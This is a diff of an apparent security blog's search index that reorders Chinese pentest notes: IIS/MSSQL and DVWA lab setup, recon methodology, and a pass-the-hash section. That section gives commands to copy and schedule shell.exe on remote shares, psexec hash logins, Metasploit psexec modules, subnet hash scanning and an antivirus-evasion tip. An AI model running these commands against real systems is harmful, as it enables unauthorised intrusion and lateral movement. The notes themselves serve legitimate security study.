@@ -4378,7 +4378,7 @@
 <td align="left">删除admin所在行，删除限定符必须唯一</td>
 </tr>
 <tr>
-<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#109;">&#49;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#109;</a>](mailto:<a href="mailto:&#49;&#x40;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#49;&#x40;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a>)’ WHERE uname=’admin’; “);</td>
+<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#x31;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>](mailto:<a href="mailto:&#49;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;">&#49;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;</a>)’ WHERE uname=’admin’; “);</td>
 <td align="left">修改admin密码邮箱</td>
 </tr>
 <tr>
@@ -5852,6 +5852,57 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows搭建IIS+MSSql</title>
+    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/</url>
+    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
+<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
+<p>修改网站访问端口号</p>
+<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
+<thead>
+<tr>
+<th align="left">报错类型</th>
+<th align="left">做法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">403（无访问主程序）</td>
+<td align="left">修改默认文档，增加index.asp</td>
+</tr>
+<tr>
+<td align="left">500（无法访问文件）</td>
+<td align="left">ASP-启用父路径</td>
+</tr>
+<tr>
+<td align="left">提示未启用32位程序池</td>
+<td align="left">应用程序池-网站-高级设置-32位应用程序池-True</td>
+</tr>
+<tr>
+<td align="left">没有操作权限</td>
+<td align="left">修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制</td>
+</tr>
+</tbody></table>
+<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" alt="image-20210809143026487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" class="lozad post-image"></p>
+<p>2、限制数据库权限（从管理员权限降权）</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" alt="image-20210809143259187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" class="lozad post-image"></p>
+<p>3、混合模式，设置密码，添加管理员</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" alt="image-20210809143322279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" class="lozad post-image"></p>
+<p>4、后续全部确认即可</p>
+<p>5、新建数据库（testdb）</p>
+<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
+<p>7、替换网站原有数据库</p>
+<p>8、修改网站数据库配置文件</p>
+<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
+<p>注意：mssql账号为sa</p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>IIS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows随记</title>
     <url>/article/Windows%E9%9A%8F%E8%AE%B0/</url>
     <content><![CDATA[<table>
@@ -5947,57 +5998,6 @@
       </categories>
       <tags>
         <tag>随记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows搭建IIS+MSSql</title>
-    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/</url>
-    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
-<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
-<p>修改网站访问端口号</p>
-<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
-<thead>
-<tr>
-<th align="left">报错类型</th>
-<th align="left">做法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">403（无访问主程序）</td>
-<td align="left">修改默认文档，增加index.asp</td>
-</tr>
-<tr>
-<td align="left">500（无法访问文件）</td>
-<td align="left">ASP-启用父路径</td>
-</tr>
-<tr>
-<td align="left">提示未启用32位程序池</td>
-<td align="left">应用程序池-网站-高级设置-32位应用程序池-True</td>
-</tr>
-<tr>
-<td align="left">没有操作权限</td>
-<td align="left">修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制</td>
-</tr>
-</tbody></table>
-<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" alt="image-20210809143026487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" class="lozad post-image"></p>
-<p>2、限制数据库权限（从管理员权限降权）</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" alt="image-20210809143259187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" class="lozad post-image"></p>
-<p>3、混合模式，设置密码，添加管理员</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" alt="image-20210809143322279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" class="lozad post-image"></p>
-<p>4、后续全部确认即可</p>
-<p>5、新建数据库（testdb）</p>
-<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
-<p>7、替换网站原有数据库</p>
-<p>8、修改网站数据库配置文件</p>
-<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
-<p>注意：mssql账号为sa</p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -6459,6 +6459,55 @@
       </tags>
   </entry>
   <entry>
+    <title>centos7搭建DVWA</title>
+    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
+    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<p>启动apache并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
+
+<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+<p>启动Mysql并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
+
+<p>配置Mysql数据库</p>
+<p>初始化mysql数据库（全部回车确认）</p>
+<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
+
+<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<p>重启apache使php生效（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<p>配置</p>
+<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
+
+<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
+
+<p>解压并复制到/var/www/html目录</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
+
+<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
+
+<p>创建数据库</p>
+<p>登录（admin:password）</p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE和SSRF</title>
     <url>/article/XXE%E5%92%8CSSRF/</url>
     <content><![CDATA[<p>XML是可拓展标识语言的简写；功能是传输数据，不是显示数据；</p>
@@ -6817,126 +6866,6 @@
       </tags>
   </entry>
   <entry>
-    <title>hash传递</title>
-    <url>/article/hash%E4%BC%A0%E9%80%92/</url>
-    <content><![CDATA[<h1 id="IPC攻击"><a href="#IPC攻击" class="headerlink" title="IPC攻击"></a>IPC攻击</h1><p>IPC共享 管道命令 的资源，实现进程间的资源共享，可以进行命令执行</p>
-<p>139：文件传输（2008以后弃用）</p>
-<p>445：身份认证（主要）</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>net  use \\_ip\ipc$ _pass /user:_name </code></td>
-<td>建立连接</td>
-</tr>
-<tr>
-<td>net  use</td>
-<td>查看当前连接</td>
-</tr>
-<tr>
-<td>使用</td>
-<td>复制xxx到目标c盘www目录下：<br>copy  xxx <a href="file://_ip/c$/www">\_ip\c$\www</a>  <br><br>常用命令 ：<br>dir、copy、at、move、rename<br><code>dir \\_ip\c$</code>  查看c盘文件  <br><code>net time \\_ip </code>  查看时间  <br><code>copy shell.exe \\_ip\c$\</code>   复制到c盘  <br><code>at \\_ip 19:18:00 c:\shell.exe</code>   计划任务</td>
-</tr>
-<tr>
-<td><code>net share  ipc$ /del  </code></td>
-<td>删除连接</td>
-</tr>
-<tr>
-<td>工具</td>
-<td>pstools 微软官方集成的命令工具集  <br><code>psexec.exe /accepteula \\_ip</code>  不弹窗执行IPC命令</td>
-</tr>
-</tbody></table>
-<h1 id="哈希传递（PTH）"><a href="#哈希传递（PTH）" class="headerlink" title="哈希传递（PTH）"></a>哈希传递（PTH）</h1><p>hash加密过程：明文 -&gt; hex -&gt; unicode -&gt; md4</p>
-<p>身份认证过程中，没有使用明文密码验证，而是hash验证，只要获取hash值，可以直接使用hash进行身份验证。</p>
-<p>注意：2003和2008+的hash不同（相同明文加密方式不同，不可通用）</p>
-<p>哈希登录工具：</p>
-<p>cs、msf、impacket、mimikatz、ladon等</p>
-<p><strong>使用前提：</strong></p>
-<p>445处于开启状态（批量扫描445端口主机）</p>
-<p><strong>impacket（单个）：</strong></p>
-<p>注：</p>
-<p>cs中targets中右击也是单个传递（也可多选进行传递，但是会卡死，强烈不推荐！！！）</p>
-<p>python版本：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
-<p>windows版本：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">psexec.exe _user:_pass@_ip cmd  	# 密码登录</span><br><span class="line">psexec.exe -hashes _hash _user@_ip cmd  	# hash登录</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">pth（pass the hash）限制  sid  501 administrator才可以hash登录</span><br><span class="line">2003/xp/2008 没有kb2871997补丁 任何用户都可以进行pth</span><br><span class="line">最后全部使用管理员账户的hash进行传递攻击</span><br></pre>
-
-<p><strong>msf psexec模块</strong></p>
-<pre class="highlight"><span class="line">auxiliary/admin/smb/psexec_command		# 执行单个命令的PTH模块</span><br><span class="line">exploit/windows/smb/psexec		# 执行直接就获取到meterpreter的PTH模块</span><br><span class="line">exploit/windows/smb/psexec_psh		# 支持对一个网段进行PTH进行验证的模块</span><br></pre>
-
-
-
-<p><strong>Ladon</strong></p>
-<p>user.txt放用户名</p>
-<p>pass.txt放32+32位hash</p>
-<p>命令</p>
-<p>shell c:\windows\Landon.exe 192.168.21.12/24 SmbHashScan</p>
-<p>注意：</p>
-<p>exe版本ladon大概率被杀软拦截，建议换成ps1的powershell版本</p>
-<p>（user.txt和pass.txt设置与exe相同）</p>
-<pre class="highlight"><span class="line">shell powershell.exe Import-Module Ladon7.ps1;Ladon smbhashscan </span><br></pre>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>hash传递</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7搭建DVWA</title>
-    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
-    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
-<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<p>启动apache并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
-
-<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-<p>启动Mysql并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
-
-<p>配置Mysql数据库</p>
-<p>初始化mysql数据库（全部回车确认）</p>
-<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
-
-<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
-<p>重启apache使php生效（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<p>配置</p>
-<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
-
-<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
-
-<p>解压并复制到/var/www/html目录</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
-
-<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
-
-<p>创建数据库</p>
-<p>登录（admin:password）</p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>msf和stowaway代理</title>
     <url>/article/msf%E5%92%8Cstowaway%E4%BB%A3%E7%90%86/</url>
     <content><![CDATA[<h1 id="msf代理"><a href="#msf代理" class="headerlink" title="msf代理"></a>msf代理</h1><p>meterpreter中</p>
@@ -7010,6 +6939,131 @@
       </categories>
       <tags>
         <tag>代理工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息收集</title>
+    <url>/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<table>
+<thead>
+<tr>
+<th align="left">步骤</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">前期交互</td>
+<td align="left">渗透人员+甲方客户-&gt;签授权合同  <br>规定攻击方式 ： <br>&#9;apt、钓鱼、近源、web、ddos、禁止延时盲注等  <br>规定渗透范围 ： <br>&#9;公司范围、目标范围  <br>规定渗透时间 ： <br>&#9;攻防演练：7天 长期渗透：2-3年  <br>规定法律法规相关 <br>规定信息泄露相关</td>
+</tr>
+<tr>
+<td align="left">信息搜集</td>
+<td align="left">大型企业 ：股权信息搜集 <br>中型企业 ：域名 <br>小型企业 ：IP  信息<br><br>收集方式 <br>主动收集：<br>与目标交互，会记录自己的操作信息 <br>被动收集：<br>不与目标交互，搜索引擎等工具  <br><br><strong>谷歌语法</strong> <br>site:找到与指定网站有联系的URL <br>inurl：将返回url中含有关键词的网页 <br>allinurl：与inurl类似，可以指定多个词 <br>intext：寻找正文中含有关键字的网页 <br>allintext：寻找正文中的多个关键字 <br>intitle：寻找标题中含有关键字的网页 <br>allintitle：寻找标题中的多个关键字 <br>filetype：指定访问的文件类型  <br><br>符号使用 <br>1、精确搜索： <br>给关键词加上双引号实现精确匹配双引号内的字符 <br><br>2、通配符： <br>谷歌的通配符是星号<code>&quot;*&quot;</code>，必须在精确搜索符双引号内部使用。用通配符代替关键词或短语中无法确定的字词 <br><br>3、点号匹配任意字符： <br>点号<code>&quot;.&quot;</code>匹配的是匹配某个字符，不是字、短语等内容。 <br><br>4、基本搜索符号约束： <br>加号<code>&quot;+&quot;</code>用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加<code>&quot;-&quot;</code>减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选。 <br><br>5、数字范围：<br>用两个点号<code>&quot;..&quot;</code>表示一个数字范围。一般应用于日期、货币、尺寸、重量、高度等范围的搜索如：手机2000..3000元，注意“3000”与“元”之间必须有空格<br><br>6、布尔逻辑：<br>或，符号`”</td>
+</tr>
+<tr>
+<td align="left">威胁建模</td>
+<td align="left">建立excle表格，进行信息整理，初步猜测可能存在的漏洞点 域名、IP、端口、中间件等</td>
+</tr>
+<tr>
+<td align="left">渗透测试</td>
+<td align="left">top10漏洞、cms漏洞等 <br>注意： <br>挖src时，只允许到此截断，且webshell只允许输出提示语句（echo ‘ok’等）； <br>xss只允许使用console.log(/xss/)等 …</td>
+</tr>
+<tr>
+<td align="left">后渗透测试</td>
+<td align="left">有指向性的获取目标数据（狭义上：内网渗透）</td>
+</tr>
+<tr>
+<td align="left">报告截断</td>
+<td align="left">撰写报告</td>
+</tr>
+</tbody></table>
+<p>其他：</p>
+<p>注册网站信息查询</p>
+<p><a href="https://www.reg007.com/">https://www.reg007.com/</a></p>
+<p>网站监测</p>
+<p><a href="https://anquan.baidu.com/product/secindex?industry=total">https://anquan.baidu.com/product/secindex?industry=total</a></p>
+<p>DNS信息</p>
+<p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
+<p>whoami信息</p>
+<p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
+<p>网站指纹信息</p>
+<p><a href="https://www.godeye.vip/">https://www.godeye.vip/</a></p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hash传递</title>
+    <url>/article/hash%E4%BC%A0%E9%80%92/</url>
+    <content><![CDATA[<h1 id="IPC攻击"><a href="#IPC攻击" class="headerlink" title="IPC攻击"></a>IPC攻击</h1><p>IPC共享 管道命令 的资源，实现进程间的资源共享，可以进行命令执行</p>
+<p>139：文件传输（2008以后弃用）</p>
+<p>445：身份认证（主要）</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>net  use \\_ip\ipc$ _pass /user:_name </code></td>
+<td>建立连接</td>
+</tr>
+<tr>
+<td>net  use</td>
+<td>查看当前连接</td>
+</tr>
+<tr>
+<td>使用</td>
+<td>复制xxx到目标c盘www目录下：<br>copy  xxx <a href="file://_ip/c$/www">\_ip\c$\www</a>  <br><br>常用命令 ：<br>dir、copy、at、move、rename<br><code>dir \\_ip\c$</code>  查看c盘文件  <br><code>net time \\_ip </code>  查看时间  <br><code>copy shell.exe \\_ip\c$\</code>   复制到c盘  <br><code>at \\_ip 19:18:00 c:\shell.exe</code>   计划任务</td>
+</tr>
+<tr>
+<td><code>net share  ipc$ /del  </code></td>
+<td>删除连接</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>pstools 微软官方集成的命令工具集  <br><code>psexec.exe /accepteula \\_ip</code>  不弹窗执行IPC命令</td>
+</tr>
+</tbody></table>
+<h1 id="哈希传递（PTH）"><a href="#哈希传递（PTH）" class="headerlink" title="哈希传递（PTH）"></a>哈希传递（PTH）</h1><p>hash加密过程：明文 -&gt; hex -&gt; unicode -&gt; md4</p>
+<p>身份认证过程中，没有使用明文密码验证，而是hash验证，只要获取hash值，可以直接使用hash进行身份验证。</p>
+<p>注意：2003和2008+的hash不同（相同明文加密方式不同，不可通用）</p>
+<p>哈希登录工具：</p>
+<p>cs、msf、impacket、mimikatz、ladon等</p>
+<p><strong>使用前提：</strong></p>
+<p>445处于开启状态（批量扫描445端口主机）</p>
+<p><strong>impacket（单个）：</strong></p>
+<p>注：</p>
+<p>cs中targets中右击也是单个传递（也可多选进行传递，但是会卡死，强烈不推荐！！！）</p>
+<p>python版本：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>windows版本：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">psexec.exe _user:_pass@_ip cmd  	# 密码登录</span><br><span class="line">psexec.exe -hashes _hash _user@_ip cmd  	# hash登录</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">pth（pass the hash）限制  sid  501 administrator才可以hash登录</span><br><span class="line">2003/xp/2008 没有kb2871997补丁 任何用户都可以进行pth</span><br><span class="line">最后全部使用管理员账户的hash进行传递攻击</span><br></pre>
+
+<p><strong>msf psexec模块</strong></p>
+<pre class="highlight"><span class="line">auxiliary/admin/smb/psexec_command		# 执行单个命令的PTH模块</span><br><span class="line">exploit/windows/smb/psexec		# 执行直接就获取到meterpreter的PTH模块</span><br><span class="line">exploit/windows/smb/psexec_psh		# 支持对一个网段进行PTH进行验证的模块</span><br></pre>
+
+
+
+<p><strong>Ladon</strong></p>
+<p>user.txt放用户名</p>
+<p>pass.txt放32+32位hash</p>
+<p>命令</p>
+<p>shell c:\windows\Landon.exe 192.168.21.12/24 SmbHashScan</p>
+<p>注意：</p>
+<p>exe版本ladon大概率被杀软拦截，建议换成ps1的powershell版本</p>
+<p>（user.txt和pass.txt设置与exe相同）</p>
+<pre class="highlight"><span class="line">shell powershell.exe Import-Module Ladon7.ps1;Ladon smbhashscan </span><br></pre>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>hash传递</tag>
       </tags>
   </entry>
   <entry>
@@ -7185,60 +7239,6 @@
       </categories>
       <tags>
         <tag>入侵排查</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集</title>
-    <url>/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<table>
-<thead>
-<tr>
-<th align="left">步骤</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">前期交互</td>
-<td align="left">渗透人员+甲方客户-&gt;签授权合同  <br>规定攻击方式 ： <br>&#9;apt、钓鱼、近源、web、ddos、禁止延时盲注等  <br>规定渗透范围 ： <br>&#9;公司范围、目标范围  <br>规定渗透时间 ： <br>&#9;攻防演练：7天 长期渗透：2-3年  <br>规定法律法规相关 <br>规定信息泄露相关</td>
-</tr>
-<tr>
-<td align="left">信息搜集</td>
